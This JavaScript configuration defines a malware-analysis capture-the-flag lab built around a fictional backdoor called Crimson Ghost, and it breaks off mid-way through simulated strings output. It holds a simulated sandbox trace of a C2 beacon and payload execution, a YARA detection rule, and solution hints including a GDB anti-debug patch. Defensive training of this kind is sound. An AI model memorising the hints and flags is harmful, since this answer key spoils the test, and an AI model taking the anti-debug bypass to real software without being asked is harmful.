/* ============================================================
   CTF ARENA — Box A16: The Corrupted Core
   Malware Analysis (Static + Dynamic) | Crimson Ghost
   Config: analysis tools, GDB engine, sandbox, filesystem, flags, hints, lore
   ============================================================ */

const A16Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Corrupted Core',
    subtitle: 'Malware Analysis — Crimson Ghost',

    // Tutorial mode (AR-12)
    tutorialMode: true,
    tutorial: {
            "steps": [
                    {
                            "title": "Reconnaissance",
                            "tip": "Start by scanning the target with nmap to discover services and potential attack vectors.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "cmd": "contains:nmap"
                                    }
                            }
                    },
                    {
                            "title": "Explore the target",
                            "tip": "Investigate the services you found. Browse web apps, check service versions, read documentation.",
                            "trigger": {
                                    "event": "navigate",
                                    "alt": [
                                            {
                                                    "event": "command",
                                                    "match": {
                                                            "phase": "RECON"
                                                    }
                                            }
                                    ]
                            }
                    },
                    {
                            "title": "Find the vulnerability",
                            "tip": "Look for misconfigurations, weak inputs, or known CVEs in the services you discovered.",
                            "trigger": {
                                    "event": "command",
                                    "match": {
                                            "phase": "EXPLOIT"
                                    }
                            }
                    },
                    {
                            "title": "Capture the user flag",
                            "tip": "Exploit the vulnerability to gain initial access and retrieve the user flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "user"
                                    }
                            }
                    },
                    {
                            "title": "Escalate to root",
                            "tip": "Use what you found to escalate privileges and capture the root flag.",
                            "trigger": {
                                    "event": "flag_correct",
                                    "match": {
                                            "flagId": "root"
                                    }
                            }
                    }
            ]
    },
    difficulty: 'Expert',
    accent: '#c0392b',
    storageKey: 'hexworth_ctf_a16',
    registryId: 'a16-corrupted-core',
    trackerKey: 'ctf_a16',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Malware analysis kill chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'triage',
            name: 'Triage',
            icon: '\uD83E\uDDE0',
            description: 'Confirm the file is malicious. Identify type, hash, and initial indicators before committing to deeper analysis.',
            requiredFlags: [],
            mitre: ['T1027', 'T1027.002'],
            unlocks: ['static'],
            locked: false
        },
        {
            id: 'static',
            name: 'Static Analysis',
            icon: '\uD83D\uDD0E',
            description: 'Examine the binary without executing it. Extract strings, inspect ELF headers, review imported functions, and identify obfuscation techniques.',
            requiredFlags: [],
            mitre: ['T1027', 'T1059', 'T1071', 'T1622'],
            unlocks: ['dynamic'],
            locked: true
        },
        {
            id: 'dynamic',
            name: 'Dynamic Analysis',
            icon: '\uD83C\uDFD7\uFE0F',
            description: 'Execute the sample in a controlled sandbox. Observe system calls, network connections, file system changes, and anti-analysis evasion attempts.',
            requiredFlags: ['user'],
            mitre: ['T1071.001', 'T1105', 'T1547', 'T1622'],
            unlocks: ['ioc'],
            locked: true
        },
        {
            id: 'ioc',
            name: 'Indicator Extraction',
            icon: '\uD83D\uDCCD',
            description: 'Extract all actionable IOCs: C2 addresses, domain names, protocol signatures, file hashes, and persistence artifacts.',
            requiredFlags: ['user'],
            mitre: ['T1071', 'T1105', 'T1547.001'],
            unlocks: ['remediation'],
            locked: true
        },
        {
            id: 'remediation',
            name: 'Remediation Report',
            icon: '\uD83D\uDCCB',
            description: 'Recover the decryption key, decrypt the payload, document the full attack chain, and produce a remediation report.',
            requiredFlags: ['root'],
            mitre: ['T1027.013'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'CS0-003',
        secondaryCerts: ['SY0-701'],
        mappings: [
            // CySA+ CS0-003 mappings
            { flagId: 'user', objective: '2.5', description: 'Given a scenario, use appropriate tools or techniques to determine malicious activity — Static analysis', skill: 'String Obfuscation Detection (base64 C2 encoding)', cert: 'CS0-003' },
            { flagId: 'user', objective: '2.5', description: 'Given a scenario, use appropriate tools or techniques to determine malicious activity — Network indicators', skill: 'C2 Beacon Identification via PCAP Analysis', cert: 'CS0-003' },
            { flagId: 'user', objective: '4.3', description: 'Given an incident, analyze the indicators of compromise — Malware indicators', skill: 'Malware C2 Beacon Identification (IP / Port / Protocol)', cert: 'CS0-003' },
            { flagId: 'root', objective: '2.5', description: 'Given a scenario, use appropriate tools or techniques to determine malicious activity — Dynamic analysis', skill: 'Anti-Debug Bypass via ptrace NOP Patch in GDB', cert: 'CS0-003' },
            { flagId: 'root', objective: '4.3', description: 'Given an incident, analyze the indicators of compromise — Encrypted payload decryption', skill: 'XOR Decryption Key Recovery via GDB Register Inspection', cert: 'CS0-003' },
            // CompTIA Security+ SY0-701 mappings
            { flagId: 'user', objective: '2.4', description: 'Given a scenario, analyze indicators of malicious activity — Malware types', skill: 'RAT/Backdoor Classification and C2 Channel Analysis', cert: 'SY0-701' },
            { flagId: 'user', objective: '4.3', description: 'Given an incident, use the appropriate data sources to support an investigation — Packet capture', skill: 'Network Forensics: Custom Binary Protocol Identification', cert: 'SY0-701' },
            { flagId: 'root', objective: '2.4', description: 'Given a scenario, analyze indicators of malicious activity — Obfuscated malware', skill: 'XOR Obfuscation and Payload Encryption Analysis', cert: 'SY0-701' },
            { flagId: 'root', objective: '4.4', description: 'Given an incident, apply mitigation techniques or controls to secure an environment', skill: 'Firmware Backdoor Decryption Key Recovery and Payload Documentation', cert: 'SY0-701' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'VT-x/AMD-V: Enabled',
            'Nested virtualization: Active',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nMalware sample: ~/crimson_ghost\n'
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'root', points: 200 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1000,
        minScore: 0,
        hintPenalty: -50,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 1200000, points: 100 }   // 20 minutes (Expert box)
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: "Run 'strings' on the binary — look for base64-encoded strings that might hide the C2 address. The string 'MTkyLjE2OC4xMy4zNw==' stands out.",
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: "The C2 IP is base64 encoded. Decode it: echo 'MTkyLjE2OC4xMy4zNw==' | base64 -d — that gives you the user flag IP.",
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: "The binary has anti-debug protection using ptrace. In GDB, NOP out the check: set *(int*)0x401090 = 0x90909090",
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: "Set a breakpoint at the XOR decryption routine (0x4011a0) and examine the key with 'x/s $rdi' — then use decrypt.py with that key.",
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'A forensics team at Nexarion Defense has isolated a binary from a compromised endpoint. The sample — codenamed Crimson Ghost — was recovered from a contractor\'s workstation that was quietly beaconing outbound. No AV alert fired. No SIEM rule triggered. Just a silent, steady heartbeat on port 4443. Your job: tear it apart.',
        scenario: 'A Nexarion Defense contractor received a spearphishing email with a subject line: "Revised project timeline — please review." The attached file, disguised as a PDF viewer, dropped the Crimson Ghost implant. The malware was compiled with debug-detection enabled and a stripped symbol table to frustrate analysis. The C2 address was base64-encoded inline to evade string-based AV signatures. The payload — a second-stage backdoor — was XOR-encrypted and delivered over a custom binary protocol on port 4443. The SOC analyst who initially triaged the machine found nothing unusual. Static heuristics missed the obfuscated C2. The endpoint had been compromised for 11 days before behavioral analytics finally flagged the outbound connection.',
        outro: 'The Crimson Ghost has been dissected. Its obfuscated C2 channel — a base64-encoded IP hidden in plain sight — crumbled under static analysis. Its ptrace anti-debug trap, meant to blind your debugger, was patched with four NOPs. And the Ghost Protocol — its encrypted payload and decryption key — surrendered to a breakpoint at the XOR loop. The corrupted core is corrupted no more.',
        ecer: {
            executive: 'Nexarion Defense leadership had no malware analysis capability in-house and relied entirely on commercial AV products that had not been updated to detect behavioral obfuscation. The CISO had deprioritized a sandbox deployment for three budget cycles.',
            culture: 'The security team operated in a reactive posture — waiting for AV alerts rather than hunting proactively. There was no defined incident response playbook for endpoint compromise, and analysts lacked the tooling and training to perform static or dynamic malware analysis.',
            employee: 'The contractor opened a spearphishing attachment despite security awareness training completed just 60 days earlier. The email spoofed a known project manager\'s address. The contractor did not verify via out-of-band communication before opening the file.',
            regulatory: 'The organization had no CMMC Level 2 compliance requirement and operated under a self-attested cybersecurity posture. No third-party pen test had been conducted in over two years. The absence of a mandatory sandbox analysis requirement allowed the implant to operate undetected for nearly two weeks.'
        }
    },

    // ═══════════════════════════════════════════════════════
    // DECOYS — Misleading artifacts to reward careful analysis
    // Red-herring files, fake PDB paths, and benign samples
    // that look suspicious but lead nowhere.
    // ═══════════════════════════════════════════════════════

    decoys: {

        // Fake malware samples — benign content, suspicious names
        fakesamples: [
            {
                path: '/home/kali/samples/svchost_backup.exe',
                fileType: 'PE32 executable (GUI) Intel 80386, for MS Windows',
                sha256: '3b4e6f7a8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f',
                strings_hint: 'Contains standard Windows API calls: CreateFile, RegOpenKey, GetSystemInfo. No network calls.',
                note: 'Benign Windows system utility. PDB path suggests custom build: C:\\\\builds\\\\sysutils\\\\svchost_backup.pdb — but the binary is clean. Red herring.'
            },
            {
                path: '/home/kali/samples/updater.sh',
                fileType: 'POSIX shell script, ASCII text executable',
                sha256: '9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b',
                strings_hint: 'apt-get update, apt-get upgrade -y, systemctl restart cron — standard update script.',
                note: 'Legitimate maintenance script found in /home/kali/samples/. Looks suspicious at first glance due to crontab modification, but the cron entry is for routine updates only. Not related to Crimson Ghost.'
            },
            {
                path: '/home/kali/samples/netmon.bin',
                fileType: 'ELF 64-bit LSB executable, x86-64, statically linked, stripped',
                sha256: 'f1e2d3c4b5a6978869504132231405f6e7d8c9b0a1f2e3d4c5b6a7988970615243',
                strings_hint: 'libpcap strings present. "Monitoring interface eth0". No suspicious network destinations.',
                note: 'Statically linked packet sniffer. Stripped binary looks alarming — but strings reveal only local monitoring activity. Sha256 does not match any known malware families. Not the sample you are looking for.'
            }
        ],

        // Misleading PDB paths embedded in the Crimson Ghost binary
        fakePdbPaths: [
            {
                offset: '0x20e0',
                value: 'C:\\\\Users\\\\developer\\\\Documents\\\\projects\\\\network_tool\\\\Release\\\\net_helper.pdb',
                analysis: 'PDB path suggests a benign "network helper" tool. This is intentional misdirection embedded by the malware author. The actual project name and build path have been spoofed to look like legitimate developer tooling.'
            },
            {
                offset: '0x20f8',
                value: 'D:\\\\workspace\\\\system_updater\\\\x64\\\\system_update_service.pdb',
                analysis: 'Secondary fake PDB path disguising the payload as a "system update service". Windows-style path in a Linux ELF binary is a clear indicator of cross-compilation with deliberate obfuscation.'
            }
        ],

        // Red-herring registry artifacts (simulated for Windows pivot context)
        registryArtifacts: [
            {
                key: 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\SysUpdateHelper',
                value: 'C:\\\\Windows\\\\System32\\\\svchost_backup.exe',
                analysis: 'This registry key appears to point to a persistence mechanism — but svchost_backup.exe is the benign utility in /home/kali/samples/. The threat actor may have planted this key as a decoy to waste analyst time while the real persistence mechanism (crontab via the Stage 2 payload) runs undetected.'
            },
            {
                key: 'HKCU\\\\SOFTWARE\\\\CrimsonSoft\\\\Updater',
                value: 'version=2.1.0;last_check=2024-11-30T09:14:22Z',
                analysis: 'Appears to be a legitimate software updater registry key. "CrimsonSoft" is a real software vendor. This key was present before the compromise. Not IOC-relevant — included in the forensic image as noise.'
            }
        ],

        // Notes for instructor/assessment mode — which decoys were inspected
        _decoyState: {
            fakeSamplesInspected: [],
            fakePdbFound: false,
            registryDecoyNoted: false
        }
    },

    // ═══════════════════════════════════════════════════════
    // STATE TRACKING — progression gates for analysis phases
    // ═══════════════════════════════════════════════════════

    _state: {
        c2Identified: false,
        antiDebugBypassed: false,
        keyExtracted: false,
        gdbActive: false,
        gdbPtracePatched: false,
        gdbBreakpointSet: false,
        sandboxRun: false
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Cuckoo Sandbox Results (minimal browser content)
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://localhost:5000/',

        pages: {

            // ── Cuckoo Sandbox Dashboard ──────────────────────
            'http://localhost:5000/': {
                title: 'Cuckoo Sandbox — Analysis Results',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ccd;">
                        <h1 style="color:#c0392b; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px; letter-spacing:0.05em;">&#9763; Cuckoo Sandbox</h1>
                        <div style="color:#888; font-size:0.78rem;">Automated Malware Analysis &mdash; Report #2024-CG-0091</div>
                    </div>

                    <div style="max-width:700px; margin:0 auto;">

                        <div style="color:#c0392b; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">SAMPLE INFORMATION</div>

                        <table style="width:100%; border-collapse:collapse; font-size:0.8rem; margin-bottom:24px;">
                            <tbody>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-weight:600; color:#2c3e50; width:180px;">File Name</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">crimson_ghost</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-weight:600; color:#2c3e50;">File Type</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.75rem;">ELF 64-bit LSB executable, x86-64</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-weight:600; color:#2c3e50;">SHA-256</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">a3f8c9d1e7b2450f6a8d3c1e9f0b7a2d5c4e8f1a6b3d9e0c7f2a5b8d1e4c7f0a</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-weight:600; color:#2c3e50;">Threat Score</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#c0392b; font-weight:700;">9.2 / 10 &mdash; MALICIOUS</td>
                                </tr>
                                <tr>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; font-weight:600; color:#2c3e50;">Classification</td>
                                    <td style="padding:6px 12px; border-bottom:1px solid #eee; color:#c0392b;">Backdoor / RAT (Remote Access Trojan)</td>
                                </tr>
                            </tbody>
                        </table>

                        <div style="color:#c0392b; font-size:0.78rem; font-weight:700; letter-spacing:0.1em; margin-bottom:16px; padding-bottom:6px; border-bottom:1px solid #eef;">BEHAVIORAL ANALYSIS</div>

                        <div style="margin-bottom:20px;">
                            <div style="font-size:0.78rem; font-weight:600; color:#2c3e50; margin-bottom:8px;">Process Activity</div>
                            <div style="background:#1a1a2e; border-radius:4px; padding:12px; font-family:monospace; font-size:0.72rem; color:#a8d8a8; line-height:1.8;">
PID 1842  crimson_ghost<br>
&nbsp;&nbsp;|- ptrace(PTRACE_TRACEME, 0, 0, 0) = -1  [anti-debug check]<br>
&nbsp;&nbsp;|- socket(AF_INET, SOCK_STREAM, 0) = 3<br>
&nbsp;&nbsp;|- connect(3, {sa_family=AF_INET, sin_port=htons(4443), sin_addr=inet_addr("<span style="color:#e74c3c;">**ENCRYPTED**</span>")}, 16)<br>
&nbsp;&nbsp;|- send(3, "\\x43\\x47\\x02\\x01...", 64, 0)<br>
&nbsp;&nbsp;|- recv(3, "\\x43\\x47\\x02\\x02...", 1024, 0)<br>
&nbsp;&nbsp;|- open("/tmp/.cg_payload", O_WRONLY|O_CREAT, 0644)<br>
&nbsp;&nbsp;|- write(4, "[encrypted blob]", 2048)<br>
&nbsp;&nbsp;|- close(4)<br>
&nbsp;&nbsp;|- execve("/tmp/.cg_payload", [...], [...])
                            </div>
                        </div>

                        <div style="margin-bottom:20px;">
                            <div style="font-size:0.78rem; font-weight:600; color:#2c3e50; margin-bottom:8px;">Network Connections</div>
                            <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                                <thead>
                                    <tr style="background:#eef1f6;">
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Protocol</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Destination</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Port</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Status</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">TCP</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; color:#c0392b;">192.168.13.37</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace;">4443</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#e67e22; font-weight:700;">SYN_SENT (timeout)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <div style="margin-top:8px; padding:8px 12px; background:#fff8e1; border:1px solid #ffe082; border-radius:4px; font-size:0.72rem; color:#7a6200;">
                                <strong>Note:</strong> Destination IP was recovered from network capture. The binary obfuscates this address using base64 encoding at runtime.
                            </div>
                        </div>

                        <div style="margin-bottom:20px;">
                            <div style="font-size:0.78rem; font-weight:600; color:#2c3e50; margin-bottom:8px;">File System Changes</div>
                            <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                                <thead>
                                    <tr style="background:#eef1f6;">
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Operation</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Path</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Details</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#e67e22;">CREATE</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">/tmp/.cg_payload</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">Encrypted payload dropped, 2048 bytes</td>
                                    </tr>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#e67e22;">MODIFY</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">/tmp/.cg_payload</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">chmod +x, then execve()</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <div style="margin-bottom:20px;">
                            <div style="font-size:0.78rem; font-weight:600; color:#2c3e50; margin-bottom:8px;">Anti-Analysis Techniques Detected</div>
                            <table style="width:100%; border-collapse:collapse; font-size:0.78rem;">
                                <thead>
                                    <tr style="background:#eef1f6;">
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Technique</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">Details</th>
                                        <th style="padding:6px 10px; text-align:left; color:#2c3e50; border-bottom:2px solid #ccd;">MITRE ATT&CK</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#c0392b; font-weight:600;">ptrace anti-debug</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">Calls ptrace(PTRACE_TRACEME) to detect debuggers</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">T1622</td>
                                    </tr>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#c0392b; font-weight:600;">String obfuscation</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">C2 address encoded in base64</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">T1027</td>
                                    </tr>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#c0392b; font-weight:600;">Encrypted payload</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">XOR + AES-256-CBC encrypted second stage</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">T1027.013</td>
                                    </tr>
                                    <tr>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; color:#c0392b; font-weight:600;">Binary stripping</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee;">Symbol table removed (stripped binary)</td>
                                        <td style="padding:5px 10px; border-bottom:1px solid #eee; font-family:monospace; font-size:0.72rem;">T1027.002</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <div style="padding:12px 14px; background:#f8f9fb; border:1px solid #dde; border-radius:4px; font-size:0.75rem; color:#888;">
                            Report generated: 2024-12-01 14:32:07 UTC &mdash; Cuckoo Sandbox v2.0.7 &mdash; Analysis duration: 120s
                        </div>
                    </div>
                `
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (Kali analysis VM)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'crimson_ghost': {
                                    type: 'file',
                                    content: '[ELF 64-bit binary — crimson_ghost — use analysis tools to examine]'
                                },
                                'crimson_ghost.pcap': {
                                    type: 'file',
                                    content: '[PCAP capture file — use tcpdump or wireshark to analyze]'
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE CORRUPTED CORE ===\nTarget: crimson_ghost (Linux ELF binary)\nClassification: Backdoor / RAT\nCodename: Crimson Ghost\n\nIntel:\n  - A new strain of highly evasive malware has been isolated from a compromised system\n  - The binary connects to a hidden C2 server (address obfuscated)\n  - Contains an encrypted payload that deploys upon C2 handshake\n  - Known to employ anti-debugging techniques\n\nObjectives:\n  1. Perform static analysis — identify file type, strings, imported functions\n  2. Decode the obfuscated C2 address (user flag = C2 IP wrapped in flag format)\n  3. Perform dynamic analysis — sandbox execution, network capture\n  4. Bypass anti-debug protection in GDB\n  5. Extract the decryption key from the XOR routine (root flag)\n  6. Run decrypt.py with the recovered key to decode the payload\n\nRecommended Tools:\n  file, strings, readelf, checksec, objdump\n  ltrace, strace, tcpdump, wireshark\n  gdb (with anti-debug bypass)\n  python3 decrypt.py\n\nFlags:\n  user.txt — C2 server address\n  root.txt — Ghost Protocol decryption key\n\nGood luck, analyst.'
                                },
                                'tools': {
                                    type: 'dir',
                                    children: {
                                        'decrypt.py': {
                                            type: 'file',
                                            content: '#!/usr/bin/env python3\n"""\ndecrypt.py — Crimson Ghost Payload Decryptor\nUsage: python3 decrypt.py <key>\n\nDecrypts the extracted payload using the recovered XOR key.\nThe key must be extracted from the binary\'s decryption routine.\n"""\nimport sys\n\ndef xor_decrypt(data, key):\n    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])\n\nif __name__ == "__main__":\n    if len(sys.argv) < 2:\n        print("Usage: python3 decrypt.py <key>")\n        print("Extract the key from the XOR routine at 0x4011a0 using GDB")\n        sys.exit(1)\n\n    key = sys.argv[1].encode()\n    # Simulated encrypted payload\n    encrypted = b"\\x43\\x47\\x02\\x01..."  # truncated\n    decrypted = xor_decrypt(encrypted, key)\n    print(f"[*] Decrypting payload with key: {sys.argv[1]}")\n    print(f"[+] Decrypted payload:")\n    print(f"    {decrypted[:64]}")\n    print(f"[+] Flag: {{FLAG:root}}")'
                                        },
                                        'yara_rules.yar': {
                                            type: 'file',
                                            content: 'rule CrimsonGhost {\n    meta:\n        description = "Detects Crimson Ghost malware variant"\n        author = "Hexworth Threat Intel"\n        date = "2024-12-01"\n        severity = "critical"\n    strings:\n        $magic = "CrimsonGhost"\n        $b64_c2 = "MTkyLjE2OC4xMy4zNw=="\n        $xor_loop = { 31 C0 48 89 C6 48 8B 07 30 04 0E }\n        $ptrace = "ptrace"\n    condition:\n        uint32(0) == 0x464C457F and\n        ($magic or $b64_c2) and\n        $xor_loop\n}'
                                        }
                                    }
                                },
                                'analysis': {
                                    type: 'dir',
                                    children: {}
                                },
                                'samples': {
                                    type: 'dir',
                                    children: {
                                        'svchost_backup.exe': {
                                            type: 'file',
                                            content: '[PE32 binary — use file/strings to examine — collected from DFIR case 2024-11-28]'
                                        },
                                        'updater.sh': {
                                            type: 'file',
                                            content: '#!/bin/bash\n# System maintenance updater — collected alongside crimson_ghost sample\napt-get update -qq\napt-get upgrade -y -qq\nsystemctl restart cron\necho "[*] Update complete: $(date)"'
                                        },
                                        'netmon.bin': {
                                            type: 'file',
                                            content: '[ELF 64-bit statically linked binary — suspected network monitor — collected from same endpoint as crimson_ghost]'
                                        },
                                        'README.txt': {
                                            type: 'file',
                                            content: 'DFIR Sample Collection — Case 2024-CG-0091\n\nFiles recovered from compromised endpoint alongside primary sample (crimson_ghost).\nNote: Not all files in this directory are malicious. Part of the analysis task\nis to determine which samples are relevant to the Crimson Ghost campaign.\n\nApply the same triage methodology to each file before drawing conclusions.'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'file crimson_ghost\nstrings crimson_ghost\nstrings crimson_ghost | grep -i flag\nchecksec crimson_ghost\nreadelf -a crimson_ghost | head -50'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'yara': {
                                    type: 'dir',
                                    children: {}
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific malware analysis tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        // ── file — identify binary type ────────────────────────────────
        'file': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `crimson_ghost: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e4a1b3c5d7f9a2b4c6d8e0f1a3b5c7d9e1f3a5b7, for GNU/Linux 3.2.0, stripped`;
            }

            if (target === 'crimson_ghost.pcap' || target === './crimson_ghost.pcap') {
                return 'crimson_ghost.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)';
            }

            if (!target) return 'Usage: file <filename>';
            return `${target}: cannot open '${target}' (No such file or directory)`;
        },

        // ── strings — extract readable strings from binary ─────────────
        'strings': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';

            if (target === 'crimson_ghost' || target === './crimson_ghost' || target === '/home/kali/crimson_ghost') {
                return `/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
socket
connect
send
recv
close
ptrace
fork
exit
malloc
free
memcpy
memset
EVP_DecryptInit_ex
EVP_DecryptUpdate
EVP_DecryptFinal_ex
EVP_CIPHER_CTX_new
EVP_CIPHER_CTX_free
EVP_aes_256_cbc
BIO_new_mem_buf
BIO_read
BIO_free
OPENSSL_init_crypto
libssl.so.3
libcrypto.so.3
libc.so.6
GLIBC_2.34
CrimsonGhost v2.1
[*] Initializing...
Connecting to command node...
